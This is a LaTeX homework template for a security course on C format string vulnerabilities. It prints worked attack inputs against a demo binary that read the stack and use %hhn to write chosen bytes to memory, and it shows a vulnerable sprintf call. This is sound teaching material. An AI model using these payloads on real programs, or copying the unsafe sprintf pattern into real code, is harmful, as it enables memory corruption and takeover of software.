\documentclass{article}[9pt]

\usepackage{listings}
\usepackage{fullpage}
\usepackage{textcomp}
\usepackage{mdframed}

\lstset{ %
  basicstyle=\ttfamily\small,
  commentstyle=\ttfamily\small\emph,
  upquote=true,
  framerule=1.25pt,
  breaklines=true,
  showstringspaces=false,
  escapeinside={(*@}{@*)},
  belowskip=2em,
  aboveskip=1em,
}


\newenvironment{answerfont}{\fontfamily{qhv}\selectfont}{\par}
\newenvironment{myanswer}{\begin{mdframed}\begin{answerfont}}{\end{answerfont}\end{mdframed}}


%%%%%%%%%%%%%%%%%%%%%%%%%%
% To add an answer, use the myanswer environment command under \item heading,like
%
% \item What is the meaning of life, universe, everything?
% \begin{mysanswer}
%   The answer is 42!
% \end{myanswer}
%
% You can also use macro's in your \myanswer if you want to control the
% formatting. Such as verbatim enviroment or lstlisting environment.
%
% BUT(!) I have to be able to read/grade your resulting pdf to give you credit,
% so make sure your home work is well formatted.
%%%%%%%%%%%%%%%%%%%%%%%%%%%

\title{SI485h: HW 07}
\date{FILL IN THE DUE DATE}
\author{FILL IN YOUR NAME}

\begin{document}

\maketitle
\section*{Instructions}

\begin{itemize}
\item You must submit your homework using this Latex template.

\item This homework is graded out of 70 points. Point values are associated to each question.
\end{itemize}

\section*{Questions}
\label{sec:org21d4a36}

\begin{enumerate}
\item Describe, briefly, what each of the formats present the
result. For example, you might say for "\%s" that it format prints
a string, and for "\%2s" you might say that it prints 2 bytes of a
string.

\begin{enumerate}
\item \texttt{\%n}

\item \texttt{\%hn}

\item \texttt{\%hhn}

\item \texttt{\%hhx}

\item \texttt{\%10\$x}

\item \texttt{\%p}

\item \texttt{\%08x}

\item \texttt{\%8x}

\item \texttt{\%03.2f}
\end{enumerate}

\item What is the output from the following example format? \textbf{Explain.}

\begin{verbatim}
int a;
printf(“%0.10s%n\n”, “Go Navy! Beat Army!”, &a);
printf(“%d”,a);
\end{verbatim}

\item Consider the following program code

\begin{verbatim}
int i=0;
int a;
char buf[100];
while( scanf(“%s%n”,buf,&a) > 0){
  printf(“%#x: %s (%d)”, i, buf, a);

 }     
\end{verbatim}

What do you expect the output of the second \texttt{printf()} will be
given some user's input? \textbf{Explain}.

\item Consider the following code:

\begin{verbatim}
char outputbuf[128];
sprintf(outputbuf,inputbuf)
\end{verbatim}

Provide a format for \texttt{inputbuf} that uses a \uline{single} \%
directective that overflows outputbuf by 5 bytes. \textbf{Explain why
this works.}

\item For the following format print below why does this print \texttt{d}? Use
a stack digram to help explain.

\begin{verbatim}
void foo(int d){
  printf("The value of d is: %10$d\n");
}
\end{verbatim}

\item Consider the following code:

\begin{verbatim}
void foo(){
   int d = 10;
   printf("The value of d is: %d\n",d);
   printf("%x\n");
}
\end{verbatim}

What do you expect the output of the second \texttt{printf()} will be? \textbf{Explain}.

\item When conducting a format string attack, consider the following
format and output:

\begin{verbatim}
$ ./fmt_vuln BBBB.%#08x.%#08x.%#08x.%#08x

Right: BBBB.%#08x.%#08x.%#08x.%#08x

Wrong: BBBB.0xbffff2b0.0x000400.0x000004.0x42424242

[*] test_val @ 0x804a02c = 4276545 0x00414141 
\end{verbatim}

What about \texttt{Wrong} output is instructive about what is currently
be referenced by the last \%\#08x format directive?

\item Consider the format string attack below:

\begin{verbatim}
$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn

Right: ,.%#08x.%#08x.%#08x.%hhn

Wrong: ,.0xbffff2b0.0x000400.0x000004.

[*] test_val @ 0x804a02c = 4276514 0x00414122
\end{verbatim}

Explain how the \texttt{\$(printf "\textbackslash{}x2c\textbackslash{}xa0\textbackslash{}x04\textbackslash{}x08")} and the \texttt{\%hhn}
format directive allows the attacker to write a single byte

\item Consider the format string attack below:

\begin{verbatim}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn

Right: /AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn

Wrong: /AAAAAAAAAAAAAAAAAAAAAAA.0xbffff290.0x000400.0x000004.

[*] test_val @ 0x804a02c = 960577857 0x39414141
\end{verbatim}

If we wanted 0x99 to be the value instead of 0x39 when writing
the byte, what would we change the format directive to be? \textbf{Explain.}

\item Consider the below format string attack input: (note: lines ending with $\backslash$ are continuations)

\begin{verbatim}
$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")\
$(printf "\x2e\xa0\x04\x08")\
$(printf "\x2d\xa0\x04\x08")\
$(printf "\x2c\xa0\x04\x08")\
.%4\$08x.%4\$08x.%5\$08x.%\5\$08x.%6\$08x.%\6\$08x.%7\$08x.%\7\$08x
\end{verbatim}

\begin{enumerate}
\item Which of the format directives should be chnaged to \texttt{\%hhn}? \textbf{Explain.}

\item Why are all the format lengths predsecribed prior to changing
to \texttt{\%hhn}? What would happen if we built the format length one
part at a time?

\item Explain why the $\backslash$$ portion of the format? What is it used for
in the format directive? And, why is it escaped with a $\backslash$ ?
\end{enumerate}
\end{enumerate}
\end{document}